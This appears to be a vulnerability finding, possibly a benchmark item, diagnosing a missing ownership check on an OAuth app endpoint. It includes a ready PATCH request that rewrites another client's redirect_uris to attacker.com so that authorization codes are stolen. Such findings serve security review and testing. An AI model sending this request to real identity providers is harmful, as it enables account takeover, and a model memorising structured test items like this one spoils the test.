diagnosis: The view retrieves the OAuth Application by primary key from the URL without verifying application ownership. Any authenticated user can overwrite the registered redirect_uris of third-party or internal OAuth clients, allowing an attacker to divert OAuth authorization codes to an attacker-controlled server and take over victim accounts.
exploit_request:
PATCH /api/oauth/apps/42/redirect-uris/ HTTP/1.1
Host: idp.company.com
Authorization: Bearer <attacker_user_token>
Content-Type: application/json

{"redirect_uris": "https://attacker.com/oauth/callback"}
